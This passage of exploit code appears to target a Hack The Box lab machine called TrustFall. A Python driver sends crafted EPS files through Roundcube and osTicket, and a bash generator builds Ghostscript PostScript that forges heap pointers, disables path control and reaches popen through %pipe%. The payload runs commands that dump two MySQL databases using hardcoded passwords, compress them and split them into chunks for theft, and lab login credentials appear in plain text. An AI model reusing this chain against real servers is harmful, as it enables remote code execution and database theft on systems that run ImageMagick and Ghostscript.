        "ELF calibration pointer delivered",
    )
    log(
        f"stage 1 for pid={gs.pid}: ELF probe={probe:#x} words={words1}"
    )
    try:
        pointer1_response = Roundcube(args).send_and_trigger(
            writer1,
            f"TrustFall ELF pointer {root.name}-{number}",
            timeout=args.pointer_timeout,
        )
        (attempt_dir / "pointer-stage1-response.bin").write_bytes(
            pointer1_response.content
        )
    except requests.RequestException as error:
        # A client timeout does not cancel the already queued server-side
        # thumbnail.  Synchronize on the exploit's padded readiness record.
        log(f"stage 1 HTTP ended with {type(error).__name__}; checking readiness")

    log(f"stage 1 delivered; waiting {args.calibration_wait:.1f}s for live calibration")
    time.sleep(args.calibration_wait)
    calibration = oracle.read(FORGE_INDEX_PATH)
    calibration_match = re.match(rb"(-?\d+)\s+(\d+)", calibration or b"")
    if not calibration_match or int(calibration_match.group(2)) < 0:
        raise RuntimeError("stage 1 did not publish a valid calibration record")
    (attempt_dir / "forge-index").write_bytes(calibration or b"")
    log(
        "stage 1 ready: delta="
        f"{int(calibration_match.group(1))} index={int(calibration_match.group(2))}"
    )

    # Stage 2 supplies only an aligned heap scan base.  The EPS validates the
    # full path-control structure in-process and rewinds to its active flag.
    target = gs.heap_start + args.path_scan_offset
    if not gs.heap_start <= target < gs.heap_end:
        raise RuntimeError(f"computed target {target:#x} is outside the heap")
    writer2 = attempt_dir / "pointer-stage2-path-control.eps"
    words2 = make_pointer_writer(
        writer2,
        target,
        "/tmp/trustfall-opvp-pointer2",
        "path control pointer delivered",
    )
    log(
        f"stage 2 for pid={gs.pid}: path scan base={target:#x} words={words2}"
    )
    try:
        pointer2_response = Roundcube(args).send_and_trigger(
            writer2,
            f"TrustFall path pointer {root.name}-{number}",
            timeout=args.pointer_timeout,
        )
        (attempt_dir / "pointer-stage2-response.bin").write_bytes(
            pointer2_response.content
        )
    except requests.RequestException as error:
        log(
            f"stage 2 HTTP ended with {type(error).__name__}; "
            "marker check remains authoritative"
        )

    try:
        exploit_response = exploit_future.result(timeout=args.response_wait)
        (attempt_dir / "exploit-response.bin").write_bytes(exploit_response.content)
        log(
            f"exploit thumbnail returned HTTP {exploit_response.status_code}, "
            f"type={exploit_response.headers.get('Content-Type')}, "
            f"bytes={len(exploit_response.content)}"
        )
    except concurrent.futures.TimeoutError:
        log("exploit thumbnail is still running; marker check is authoritative")
    except Exception as error:
        # The marker, rather than the failed IJS handshake, is authoritative.
        log(f"exploit thumbnail ended with {type(error).__name__}: {error}")

    for check in range(1, args.marker_checks + 1):
        marker = oracle.read(MARKER_PATH)
        if marker is not None:
            (attempt_dir / "rce-marker").write_bytes(marker)
            log(f"RCE CONFIRMED: {marker.decode(errors='replace').strip()}")
            if args.diagnostics:
                collect_diagnostics(oracle, attempt_dir)
            return True
        log(f"marker check {check}/{args.marker_checks}: absent")
        if check < args.marker_checks:
            time.sleep(2)
    if args.diagnostics:
        collect_diagnostics(oracle, attempt_dir)
    return False


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--ip", default="10.129.115.133")
    parser.add_argument("--attempts", type=int, default=1)
    parser.add_argument("--mail-host", default="mailsrv.trustfall.htb")
    parser.add_argument("--mail-user", default="salvador@trustfall.htb")
    parser.add_argument("--mail-password", default="TrustFallHRSalvador1988!")
    parser.add_argument("--ticket-host", default="ticket.trustfall.htb")
    parser.add_argument("--portal-user", default="salvador@trustfall.htb")
    parser.add_argument("--portal-password", default="TrustFallPortalSalvador2026!")
    parser.add_argument(
        "--roundcube-cookie", type=Path, default=Path("/tmp/rc.newtarget.cookie")
    )
    parser.add_argument(
        "--osticket-cookie", type=Path, default=Path("/tmp/ost.cidmap.133.cookie")
    )
    parser.add_argument(
        "--payload-generator",
        type=Path,
        default=Path("/tmp/CVE-2026-22200/osticket_ticket_payload_gen.py"),
    )
    parser.add_argument("--victim-delta", type=int, default=-33096)
    parser.add_argument("--path-scan-offset", type=lambda value: int(value, 0), default=0x2000C)
    parser.add_argument("--expected-heap-size", type=lambda value: int(value, 0), default=0x41F000)
    parser.add_argument("--pid-window", type=int, default=36)
    parser.add_argument(
        "--resume-baseline",
        type=int,
        help="skip cleanup/baseline reads and batch status/maps after this known PID",
    )
    parser.add_argument("--gs-start-delay", type=float, default=3.0)
    parser.add_argument("--calibration-wait", type=float, default=2.0)
    parser.add_argument("--trigger-timeout", type=int, default=300)
    parser.add_argument("--pointer-timeout", type=int, default=240)
    parser.add_argument("--response-wait", type=int, default=20)
    parser.add_argument("--marker-checks", type=int, default=1)
    parser.add_argument("--osticket-timeout", type=int, default=60)
    parser.add_argument("--ticket-cooldown", type=float, default=8.0)
    parser.add_argument("--thumbnail-delay", type=float, default=5.0)
    parser.add_argument("--diagnostics", action="store_true")
    parser.add_argument(
        "--output",
        type=Path,
        default=WORKSPACE / "loot" / "trustfall-heap-rce",
    )
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    if args.attempts < 1:
        raise SystemExit("--attempts must be positive")
    if args.marker_checks < 1:
        raise SystemExit("--marker-checks must be positive")
    if args.osticket_timeout < 1:
        raise SystemExit("--osticket-timeout must be positive")
    if args.ticket_cooldown < 0 or args.thumbnail_delay < 0:
        raise SystemExit("cooldown values cannot be negative")
    if not args.payload_generator.is_file():
        raise SystemExit(f"payload generator not found: {args.payload_generator}")
    build_payload(args)
    root = args.output / f"run-{stamp()}"
    root.mkdir(parents=True, exist_ok=True)
    log(f"artifacts={root}")

    for attempt in range(1, args.attempts + 1):
        try:
            if run_attempt(attempt, args, root):
                return 0
        except KeyboardInterrupt:
            raise
        except Exception as error:
            log(f"attempt {attempt} failed: {type(error).__name__}: {error}")
        if attempt < args.attempts:
            log("retrying after a short cooldown")
            time.sleep(3)
    log("RCE marker was not established")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
```


## probes/build_cidmap_opvp_forge.sh

```bash
#!/usr/bin/env bash
set -euo pipefail

probe_dir=$(cd "$(dirname "$0")" && pwd)
library="$probe_dir/cidmap_opvp_marker.so"
mode=${1:-calibrate}
victim_delta=${2:-0}
victim_index=${3:-0}
pointer_tag=${TRUSTFALL_POINTER_TAG:-}
if [[ ! "$pointer_tag" =~ ^[-A-Za-z0-9._]*$ ]]; then
    printf 'invalid TRUSTFALL_POINTER_TAG: %s\n' "$pointer_tag" >&2
    exit 2
fi
pointer1="/tmp/trustfall-opvp-pointer${pointer_tag}"
pointer2="/tmp/trustfall-opvp-pointer2${pointer_tag}"
forge_index="/tmp/trustfall-forge-index${pointer_tag}"
scan_diag="/tmp/trustfall-path-scan${pointer_tag}"
progress_diag="/tmp/trustfall-pipe-progress${pointer_tag}"
pipe_marker="/tmp/trustfall-pipe-rce${pointer_tag}"
db_dump="/tmp/trustfall-mysql-dump${pointer_tag}.sql"
db_archive="/tmp/trustfall-mysql-dump${pointer_tag}.sql.gz"
db_chunk_prefix="/tmp/trustfall-dbchunk${pointer_tag}-"
db_manifest="/tmp/trustfall-dbmanifest${pointer_tag}.txt"
opvp_library="/tmp/trustfall-cidmap-opvp${pointer_tag}.so"
payload="$probe_dir/ghostscript-cidmap-opvp-forge-${mode}${pointer_tag}.eps"

if [[ "$mode" != calibrate && "$mode" != leak && "$mode" != dump && "$mode" != scan && "$mode" != exploit && "$mode" != livescan && "$mode" != liveexploit && "$mode" != liveijs && "$mode" != liveijsauto && "$mode" != livepipeauto && "$mode" != liveopvpdirect ]]; then
    printf 'usage: %s [calibrate|leak|dump|scan|exploit|livescan|liveexploit|liveijs|liveijsauto|livepipeauto|liveopvpdirect] [victim-pointer-delta] [victim-index]\n' "$0" >&2
    exit 2
fi

gcc -nostdlib -shared -fPIC -fno-stack-protector -O2 -Wall -Wextra \
    -Wl,--build-id=none -DMARKER_PATH=\"$pipe_marker\" \
    -o "$library" "$probe_dir/cidmap_opvp_marker.c"

{
    printf '%%!PS-Adobe-3.0 EPSF-3.0\n'
    printf '%%%%BoundingBox: 0 0 10000 72\n'
    printf '/methods /CIDFont /Category findresource /.PreprocessRecord get 0 get 3 get 3 get def\n'
    printf '/fillop methods /MakeInstance get 7 get 9 get 71 get 2 get 22 get def\n'
    if [[ "$mode" == livescan || "$mode" == liveexploit || "$mode" == liveijs || "$mode" == liveijsauto || "$mode" == livepipeauto || "$mode" == liveopvpdirect ]]; then
        # Live calibration tolerates this allocation, so preserve the real
        # ImageMagick renderer before the target successfully selects OPVP.
        printf '/origdev currentdevice def\n'
    fi
    printf 'mark { << /OutputDevice /opvp >> setpagedevice } stopped cleartomark\n'
    # devicedict entries are [device null] pairs.  Slot 1 is bookkeeping and
    # is explicitly nulled by setpagedevice; the live gx_device is slot 0.
    printf '/opdev devicedict /opvp get 0 get def\n'
    # Allocate the victim and backing consecutively so their relative layout
    # does not depend on later interpreter/name allocations.
    printf '/victim 2048 array def\n'
    printf '/pads 512 array def 0 1 511 { pads exch 64 string put } for\n'
    printf '/backing 64 string def\n'
    printf '0 1 63 { /i exch def backing i i 73 mul 41 add 255 and put } for\n'
    printf '/window backing 16 16 getinterval def\n'
    # A large run of adjacent refs is deterministic and gives the forge many
    # valid pointer slots even if the allocator shifts the array as a whole.
    printf '0 1 2047 { victim exch window put } for\n'
    if [[ "$mode" != livescan && "$mode" != liveexploit && "$mode" != liveijs && "$mode" != liveijsauto && "$mode" != livepipeauto && "$mode" != liveopvpdirect ]]; then
        # Fixed-layout modes cannot afford an allocation before victim/backing.
        printf '/origdev currentdevice def\n'
    fi

    if [[ "$mode" == calibrate ]]; then
        printf '{} loop\n'
    else
        if [[ "$mode" == exploit || "$mode" == liveexploit || "$mode" == livepipeauto || "$mode" == liveopvpdirect ]]; then
            printf '/lib (%s) (w) file def\n' "$opvp_library"
            while IFS= read -r hex; do
                printf 'lib <%s> writestring\n' "$hex"
            done < <(xxd -p -c 1024 "$library")
            printf 'lib closefile\n'
        fi
        # Wait for four byte-swapped 16-bit words.  Exact modes receive the
        # path-control address directly; live modes first receive a readable
        # ELF header so they can discover the victim ref in this process.
        printf '/cfg (%s) def\n' "$pointer1"
        # Do not treat mere existence as readiness: writers create/truncate
        # the file before its one-line pointer has reached disk.
        printf '{ cfg status { /created exch def /referenced exch def /bytes exch def /pages exch def bytes 12 ge { exit } if } if } loop\n'
        printf 'cfg (r) file /cf exch def\n'
        for n in 0 1 2 3; do
            printf 'cf token pop /w%s exch def\n' "$n"
        done
        printf 'cf closefile\n'
        printf '/poke { /cid exch def /value exch def '
        printf '/a 256 array def 0 1 255 { a exch 0 put } for '
        printf 'a cid 256 mod 999 put /d 1 dict def d cid 256 idiv a put '
        printf '/t 1 dict def t 999 value put d t [] 2 [window] fillop } def\n'
        if [[ "$mode" == livescan || "$mode" == liveexploit || "$mode" == liveijs || "$mode" == liveijsauto || "$mode" == livepipeauto || "$mode" == liveopvpdirect ]]; then
            # Allocate all structures needed for the second pointer rewrite
            # before forging any victim ref.  Allocating them afterwards can
            # trigger a GC that treats the forged string pointer as managed
            # VM and corrupts the interpreter dictionary.
            for n in 0 1 2 3; do
                printf '/cid%s 0 def /pa%s 256 array def 0 1 255 { pa%s exch 0 put } for\n' "$n" "$n" "$n"
                printf '/pd%s 1 dict def /pt%s 1 dict def pt%s 999 0 put\n' "$n" "$n" "$n"
                printf '/poke%s { pt%s 999 3 -1 roll put pd%s pt%s [] 2 [window] fillop } def\n' "$n" "$n" "$n" "$n"
            done
            # The allocations above can trigger a GC.  Re-read the first
            # pointer words afterwards so their dictionary entries are from
            # the stable post-allocation state.
            printf 'cfg (r) file /cf exch def\n'
            for n in 0 1 2 3; do
                printf 'cf token pop /w%s exch def\n' "$n"
            done
            printf 'cf closefile\n'
            # Calibrate the exact victim ref in this process.  The array may
            # move by 0x8000 between ImageMagick/Ghostscript invocations, but
            # its offset modulo 0x8000 is stable.
            printf '/hit -1 def /foundcid 0 def /founddelta 0 def {\n'
            for k in 0 -1 1 -2 2 -3 3 -4 4 -5 5 -6 6 -7 7 -8 8 -9 9 -10 10 -11 11 -12 12; do
                candidate=$((victim_delta + k * 32768))
                if (( candidate < 0 )); then
                    candidate_cid=$(( (4294967296 + candidate) / 2 ))
                else
                    candidate_cid=$(( candidate / 2 ))
                fi
                for n in 0 1 2 3; do
                    printf 'w%s %s poke\n' "$n" "$((candidate_cid + n))"
                done
                printf '0 1 2047 { /j exch def victim j get dup 0 get 127 eq '
                printf '{ pop /hit j def /foundcid %s def /founddelta %s def stop } { pop } ifelse } for\n' "$candidate_cid" "$candidate"
            done
            printf '} stopped pop\n'
            # Calibration leaves the selected victim ref pointing at the ELF
            # probe.  Restore it before any file/device allocations; the
            # prebuilt poke dictionaries re-forge the same slot for pointer2.
            printf '0 1 2047 { victim exch window put } for\n'
            printf '/mf (%s) (w) file def ' "$forge_index"
            printf 'mf founddelta 32 string cvs writestring mf ( ) writestring '
            # Pad the readiness record because mPDF returns HTTP 500 for the
            # original 11-byte file on this target.
            printf 'mf hit 32 string cvs writestring '
            printf 'mf (                                                                \\n) writestring mf closefile\n'
            for n in 0 1 2 3; do
                printf '/cid%s foundcid %s add def pa%s cid%s 256 mod 999 put pd%s cid%s 256 idiv pa%s put\n' "$n" "$n" "$n" "$n" "$n" "$n" "$n"
            done
            # A distinct second config avoids a delete/recreate race.
            if [[ "$mode" == livepipeauto || "$mode" == liveopvpdirect ]]; then
                if [[ "$mode" == livepipeauto ]]; then
                    # Reuse the already-created calibration file for stage
                    # state without perturbing the direct exploit path.
                    printf '/stagepath (%s) def /stage { /sm exch def /st stagepath (w) file def ' "$forge_index"
                    printf 'st sm writestring st (                                                                \\n) writestring st closefile } def\n'
                    printf '(cfg2-wait) stage\n'
                fi
                # Allocate every object and dictionary slot used by the
                # corruption phase before the victim ref is forged.
                printf '/a0 256 array def 0 1 255 { a0 exch 0 put } for a0 0 999 put\n'
                printf '/d0 1 dict def d0 0 a0 put /t0 1 dict def t0 999 0 put\n'
                printf '/sw { dup 256 mod 256 mul exch 256 idiv add } def\n'
                printf '/p0 0 def /p1 0 def /p2 0 def /p3 0 def /scanstate 0 def /foundoff -1 def '
                printf '/rmax 0 def /rnum 0 def /wmax 0 def /wnum 0 def /cmax 0 def /cnum 0 def '
                printf '/iter 0 def /s 16 string def /mx 0 def /nu 0 def\n'
            fi
            printf '/cfg2 (%s) def\n' "$pointer2"
            printf '{ cfg2 status { /created exch def /referenced exch def /bytes exch def /pages exch def bytes 12 ge { exit } if } if } loop\n'
            printf 'cfg2 (r) file /cf exch def\n'
            for n in 0 1 2 3; do
                printf 'cf token pop /w%s exch def\n' "$n"
            done
            printf 'cf closefile\n'
            if [[ "$mode" == livepipeauto ]]; then
                printf '(cfg2-read) stage\n'
            fi
            for n in 0 1 2 3; do
                printf 'w%s poke%s\n' "$n" "$n"
            done
            if [[ "$mode" == livepipeauto ]]; then
                printf '(pointer-forged) stage\n'
            fi
            if [[ "$mode" == liveopvpdirect ]]; then
                printf '/foundoff 0 def /rmax 32 def /rnum 23 def /wmax 4 def /wnum 4 def /cmax 4 def /cnum 3 def\n'
            fi

            if [[ "$mode" == liveijsauto || "$mode" == livepipeauto ]]; then
                # Pointer2 is the aligned scan base heap+0x2000c, not an
                # assumed core address.  Match the complete core signature:
                # CPSI/scanconverter/UEL immediately before active, the three
                # read/write/control sets, and the following filesystem
                # pointer.  This rejects the unrelated look-alike accepted by
                # the old four-window heuristic.
                if [[ "$mode" == liveijsauto ]]; then
                    printf '/sw { dup 256 mod 256 mul exch 256 idiv add } def\n'
                fi
                printf '/p0 w0 sw def /p1 w1 sw def /p2 w2 sw def /p3 w3 sw def\n'
                # Begin one 16-byte window before the supplied scan base.
                printf '/p0 p0 16 sub def p0 0 lt { /p0 p0 65536 add def /p1 p1 1 sub def '
                printf 'p1 0 lt { /p1 65535 def /p2 p2 1 sub def p2 sw poke2 } if p1 sw poke1 } if p0 sw poke0\n'
                printf '/scanstate 0 def /foundoff -1 def /rmax 0 def /rnum 0 def '
                printf '/wmax 0 def /wnum 0 def /cmax 0 def /cnum 0 def {\n'
                printf '0 1 16383 { /iter exch def /s victim hit get def\n'
                printf 'scanstate 0 eq {\n'
                printf 's 4 get 0 eq s 5 get 0 eq and s 6 get 0 eq and s 7 get 0 eq and '
                printf 's 8 get 1 eq and s 9 get 0 eq and s 10 get 0 eq and s 11 get 0 eq and '
                printf 's 12 get 0 eq and s 13 get 0 eq and s 14 get 0 eq and s 15 get 0 eq and '
                printf '{ /scanstate 1 def } if\n'
                printf '} { scanstate 1 eq {\n'
                printf '/mx s 4 get s 5 get 256 mul add def /nu s 8 get s 9 get 256 mul add def '
                printf 's 0 get 1 eq s 1 get 0 eq and s 2 get 0 eq and s 3 get 0 eq and '
                printf 's 6 get 0 eq and s 7 get 0 eq and s 10 get 0 eq and s 11 get 0 eq and '
                printf 'mx 4 eq mx 8 eq or mx 16 eq or mx 32 eq or mx 64 eq or mx 128 eq or and '
                printf 'nu 0 gt and nu mx le and '
                printf '{ /scanstate 2 def /foundoff iter 1 sub 16 mul def /rmax mx def /rnum nu def } '
                printf '{ /scanstate 0 def /foundoff -1 def } ifelse\n'
                printf '} { scanstate 2 eq {\n'
                printf '/mx s 4 get s 5 get 256 mul add def /nu s 8 get s 9 get 256 mul add def '
                printf 's 0 get p2 256 mod eq s 1 get p2 256 idiv eq and s 2 get 0 eq and s 3 get 0 eq and '
                printf 's 6 get 0 eq and s 7 get 0 eq and s 10 get 0 eq and s 11 get 0 eq and '
                printf 'mx 4 eq mx 8 eq or mx 16 eq or mx 32 eq or mx 64 eq or mx 128 eq or and '
                printf 'nu 0 gt and nu mx le and '
                printf '{ /scanstate 3 def /wmax mx def /wnum nu def } { /scanstate 0 def /foundoff -1 def } ifelse\n'
                printf '} { scanstate 3 eq {\n'
                printf '/mx s 4 get s 5 get 256 mul add def /nu s 8 get s 9 get 256 mul add def '
                printf 's 0 get p2 256 mod eq s 1 get p2 256 idiv eq and s 2 get 0 eq and s 3 get 0 eq and '
                printf 's 6 get 0 eq and s 7 get 0 eq and s 10 get 0 eq and s 11 get 0 eq and '
                printf 'mx 4 eq mx 8 eq or mx 16 eq or mx 32 eq or mx 64 eq or mx 128 eq or and '
                printf 'nu 0 gt and nu mx le and '
                printf '{ /scanstate 4 def /cmax mx def /cnum nu def } { /scanstate 0 def /foundoff -1 def } ifelse\n'
                printf '} { s 0 get p2 256 mod eq s 1 get p2 256 idiv eq and '
                printf 's 2 get 0 eq and s 3 get 0 eq and '
                printf 's 8 get p2 256 mod eq and s 9 get p2 256 idiv eq and '
                printf 's 10 get 0 eq and s 11 get 0 eq and { stop } '
                printf '{ /scanstate 0 def /foundoff -1 def } ifelse } ifelse } ifelse } ifelse } ifelse\n'
                printf '/p0 p0 16 add def p0 65535 gt { /p0 p0 65536 sub def /p1 p1 1 add def '
                printf 'p1 65535 gt { /p1 0 def /p2 p2 1 add def p2 sw poke2 } if p1 sw poke1 } if p0 sw poke0\n'
                printf '} for } stopped pop\n'
                # Some ImageMagick launch paths replace the filesystem object
                # and core-mode fields even though the permission arrays keep
                # their characteristic cardinalities.  If the full signature
                # missed, rescan from the supplied base for the two observed
                # correlated layouts: standalone 32/22,4/3,4/2 and delegated
                # 32/23,4/4,4/3.  Requiring all three adjacent sets and their
                # heap-pointer continuations avoids the old loose look-alike.
                printf 'foundoff -1 eq {\n'
                printf '/p0 w0 sw def /p1 w1 sw def /p2 w2 sw def /p3 w3 sw def '
                printf 'p3 sw poke3 p2 sw poke2 p1 sw poke1 p0 sw poke0\n'
                printf '/scanstate 0 def /rnum 0 def { 0 1 16383 { /iter exch def /s victim hit get def\n'
                printf 'scanstate 0 eq { /mx s 4 get s 5 get 256 mul add def /nu s 8 get s 9 get 256 mul add def '
                printf 's 0 get 1 eq s 1 get 0 eq and s 2 get 0 eq and s 3 get 0 eq and '
                printf 's 6 get 0 eq and s 7 get 0 eq and s 10 get 0 eq and s 11 get 0 eq and '
                printf 'mx 32 eq and nu 22 eq nu 23 eq or and '
                printf '{ /scanstate 1 def /foundoff iter 16 mul def /rmax mx def /rnum nu def } if '
                printf '} { scanstate 1 eq { /mx s 4 get s 5 get 256 mul add def /nu s 8 get s 9 get 256 mul add def '
                printf 's 0 get p2 256 mod eq s 1 get p2 256 idiv eq and s 2 get 0 eq and s 3 get 0 eq and '
                printf 's 6 get 0 eq and s 7 get 0 eq and s 10 get 0 eq and s 11 get 0 eq and mx 4 eq and '
                printf 'rnum 22 eq nu 3 eq and rnum 23 eq nu 4 eq and or and '
                printf '{ /scanstate 2 def /wmax mx def /wnum nu def } { /scanstate 0 def /foundoff -1 def } ifelse '
                printf '} { scanstate 2 eq { /mx s 4 get s 5 get 256 mul add def /nu s 8 get s 9 get 256 mul add def '
                printf 's 0 get p2 256 mod eq s 1 get p2 256 idiv eq and s 2 get 0 eq and s 3 get 0 eq and '
                printf 's 6 get 0 eq and s 7 get 0 eq and s 10 get 0 eq and s 11 get 0 eq and mx 4 eq and '
                printf 'rnum 22 eq nu 2 eq and rnum 23 eq nu 3 eq and or and '
                printf '{ /scanstate 3 def /cmax mx def /cnum nu def } { /scanstate 0 def /foundoff -1 def } ifelse '
                printf '} { s 0 get p2 256 mod eq s 1 get p2 256 idiv eq and s 2 get 0 eq and s 3 get 0 eq and '
                printf '{ stop } { /scanstate 0 def /foundoff -1 def } ifelse } ifelse } ifelse } ifelse\n'
                printf '/p0 p0 16 add def p0 65535 gt { /p0 p0 65536 sub def /p1 p1 1 add def '
                printf 'p1 65535 gt { /p1 0 def /p2 p2 1 add def p2 sw poke2 } if p1 sw poke1 } if p0 sw poke0\n'
                printf '} for } stopped pop } if\n'
                # A match stops with the forged string at candidate+48.
                printf '/p0 p0 48 sub def p0 0 lt { /p0 p0 65536 add def /p1 p1 1 sub def '
                printf 'p1 0 lt { /p1 65535 def /p2 p2 1 sub def p2 sw poke2 } if p1 sw poke1 } if '
                printf 'p0 sw poke0\n'
                if [[ "$mode" == liveijsauto ]]; then
                    printf 'foundoff -1 eq { /df (/tmp/trustfall-ijs-diag%s) (w) file def ' "$pointer_tag"
                    printf 'df (path-scan: missing                                                \\n) writestring df closefile /trustfall_path_scan_miss load } if\n'
                    printf '/sf (%s) (w) file def ' "$scan_diag"
                    printf 'sf foundoff 32 string cvs writestring sf ( ) writestring '
                    printf 'sf rmax 16 string cvs writestring sf (/) writestring sf rnum 16 string cvs writestring sf ( ) writestring '
                    printf 'sf wmax 16 string cvs writestring sf (/) writestring sf wnum 16 string cvs writestring sf ( ) writestring '
                    printf 'sf cmax 16 string cvs writestring sf (/) writestring sf cnum 16 string cvs writestring '
                    printf 'sf (                                                                \\n) writestring sf closefile\n'
                fi
            fi

            if [[ "$mode" == livepipeauto ]]; then
                printf '(scan-finished) stage\n'
            fi

            if [[ "$mode" == livescan ]]; then
                printf '/sw { dup 256 mod 256 mul exch 256 idiv add } def\n'
                printf '/p0 w0 sw def /p1 w1 sw def /p2 w2 sw def /p3 w3 sw def\n'
                printf '/of (/tmp/trustfall-core-candidates) (w) file def\n'
                printf '0 1 262143 { /iter exch def /s victim hit get def /match true def '
                printf 's 0 get 1 ne { /match false def } if '
                printf '1 1 3 { s exch get 0 ne { /match false def } if } for '
                printf '/mx s 4 get s 5 get 256 mul add def '
                printf 's 6 get 0 ne s 7 get 0 ne or { /match false def } if '
                printf 'mx 4 eq mx 8 eq or mx 16 eq or mx 32 eq or mx 64 eq or not { /match false def } if '
                printf '/nu s 8 get s 9 get 256 mul add def '
                printf 's 10 get 0 ne s 11 get 0 ne or { /match false def } if '
                printf 'nu 0 le nu mx gt or { /match false def } if '
                printf 'match { of iter 16 mul 12 add 32 string cvs writestring of ( ) writestring } if '
                printf '/p0 p0 16 add def p0 65535 gt { /p0 p0 65536 sub def /p1 p1 1 add def '
                printf 'p1 65535 gt { /p1 0 def /p2 p2 1 add def p2 sw poke2 } if p1 sw poke1 } if p0 sw poke0 } for\n'
                printf 'of closefile showpage\n%%%%EOF\n'
                exit 0
            fi

            if [[ "$mode" != livepipeauto && "$mode" != liveopvpdirect ]]; then
                printf '/a0 256 array def 0 1 255 { a0 exch 0 put } for a0 0 999 put\n'
                printf '/d0 1 dict def d0 0 a0 put /t0 1 dict def t0 999 0 put\n'
            else
                # A miss must restore the forged VM ref before diagnostics.
                printf 'foundoff -1 eq { victim hit window put '
                printf '/df (/tmp/trustfall-ijs-diag%s) (w) file def ' "$pointer_tag"
                printf 'df (path-scan: missing                                                \\n) writestring df closefile '
                printf '(scan-missing) stage /trustfall_path_scan_miss load } if\n'
            fi
            if [[ "$mode" == livepipeauto ]]; then
                printf '(underwrite-start) stage\n'
            fi
            printf 'd0 t0 [] 2 victim hit 1 getinterval fillop\n'
            printf 'victim hit window put\n'
            if [[ "$mode" == livepipeauto || "$mode" == liveopvpdirect ]]; then
                # path_control_active is now zero.  The pipe backend reaches
                # popen(3) directly and supplies a compact command-execution
                # proof without another device or plugin chain.
                if [[ "$mode" == livepipeauto ]]; then
                    printf '(underwrite-done) stage\n'
                fi
                printf '/sf (%s) (w) file def ' "$scan_diag"
                printf 'sf foundoff 32 string cvs writestring sf ( ) writestring '
                printf 'sf rmax 16 string cvs writestring sf (/) writestring sf rnum 16 string cvs writestring sf ( ) writestring '
                printf 'sf wmax 16 string cvs writestring sf (/) writestring sf wnum 16 string cvs writestring sf ( ) writestring '
                printf 'sf cmax 16 string cvs writestring sf (/) writestring sf cnum 16 string cvs writestring '
                printf 'sf (                                                                \\n) writestring sf closefile\n'
                printf '/pipeerr /none def { '
                printf '(%%pipe%%/usr/bin/id > %s; /usr/bin/printf RCE-CONFIRMED-XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX >> %s; ' "$pipe_marker" "$pipe_marker"
                printf '/usr/bin/mysqldump --hex-blob --user=roundcubemail_db_user --password=i7x9J5LQhk1A --databases roundcubemail_db > %s 2>&1; ' "$db_dump"
                printf '/usr/bin/mysqldump --hex-blob --user=osticket_user --password=2b28NNPcTAnZ --databases osticket >> %s 2>&1; ' "$db_dump"
                printf '/usr/bin/gzip -9 -c %s > %s; ' "$db_dump" "$db_archive"
                printf '/usr/bin/split -b 30000 -d -a 3 %s %s; ' "$db_archive" "$db_chunk_prefix"
                printf '/usr/bin/sha256sum %s > %s; /usr/bin/wc -c %s %s >> %s; ' "$db_archive" "$db_manifest" "$db_dump" "$db_archive" "$db_manifest"
                printf '/usr/bin/ls -1 %s* >> %s; /usr/bin/printf XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX >> %s) (r) file closefile ' "$db_chunk_prefix" "$db_manifest" "$db_manifest"
                printf '} stopped { /pipeerr $error /errorname get def } if clear\n'
                if [[ "$mode" == livepipeauto ]]; then
                    printf '(pipe-returned) stage\n'
                fi
                printf 'showpage\n%%%%EOF\n'
                exit 0
            fi
            if [[ "$mode" == liveijs || "$mode" == liveijsauto ]]; then
                printf '/df (/tmp/trustfall-ijs-diag) (w) file def\n'
                printf 'df (calibration: ) writestring df founddelta 32 string cvs writestring '
                printf 'df ( ) writestring df hit 32 string cvs writestring df (\\n) writestring\n'
                if [[ "$mode" == liveijsauto ]]; then
                    printf 'df (path-scan-offset: ) writestring df foundoff 32 string cvs writestring df (\\n) writestring\n'
                fi
                printf '/stageerr /none def { << /OutputDevice /ijs >> setpagedevice } '
                printf 'stopped { /stageerr $error /errorname get def } if clear\n'
                printf 'df (ijs-stage: ) writestring df stageerr 64 string cvs writestring df (\\n) writestring\n'
                printf '/ijsdev devicedict /ijs get 1 get def\n'
                printf '/putok false def /puterr /none def { ijsdev null true mark '
                printf '/IjsServer (/usr/bin/id > /tmp/trustfall-cidmap-ijs-rce) '
                printf '.putdeviceparamsonly pop pop /putok true def } '
                printf 'stopped { /puterr $error /errorname get def } if clear\n'
                printf 'putok { df (ijs-params: ok\\n) writestring } '
                printf '{ df (ijs-params: ) writestring df puterr 64 string cvs writestring df (\\n) writestring } ifelse\n'
                printf '/ijsok false def /ijserr /none def { ijsdev setdevice /ijsok true def } '
                printf 'stopped { /ijserr $error /errorname get def } if clear\n'
                printf 'ijsok { df (ijs-open: ok\\n) writestring } '
                printf '{ df (ijs-open: ) writestring df ijserr 64 string cvs writestring df (\\n) writestring } ifelse\n'
                printf 'df closefile showpage\n%%%%EOF\n'
                exit 0
            fi
            printf '/df (/tmp/trustfall-opvp-diag) (w) file def\n'
            printf 'df (calibration: ) writestring df founddelta 32 string cvs writestring '
            printf 'df ( ) writestring df hit 32 string cvs writestring df (\\n) writestring\n'
            printf 'df (flag-after: ) writestring /fs victim hit get def '
            printf '0 1 15 { fs exch get 8 string cvs df exch writestring df ( ) writestring } for df (\\n) writestring\n'
            # A failed open leaves finddevice's fresh mutable copy in slot 1.
            # Configure that closed copy with the real driver and open it.
            printf 'df (strategy: failed-open-then-real-driver\\n) writestring df closefile\n'
            printf '/df (/tmp/trustfall-opvp-diag2) (w) file def\n'
            printf '/awayok false def /awayerr /none def { origdev setdevice /awayok true def } stopped '
            printf '{ /awayerr $error /errorname get def } if clear\n'
            printf 'awayok { df (switch-away: ok\\n) writestring } '
            printf '{ df (switch-away: ) writestring df awayerr 64 string cvs writestring df (\\n) writestring } ifelse\n'
            printf '/failerr /none def { << /OutputDevice /opvp /Driver (/tmp/trustfall-no-such-driver.so) >> setpagedevice } '
            printf 'stopped { /failerr $error /errorname get def } if clear\n'
            printf 'df (staging-open: ) writestring df failerr 64 string cvs writestring df (\\n) writestring\n'
            printf '/opdev devicedict /opvp get 1 get def\n'
            printf '/putok false def /puterr /none def { opdev null true mark /Driver (/tmp/trustfall-cidmap-opvp.so) '
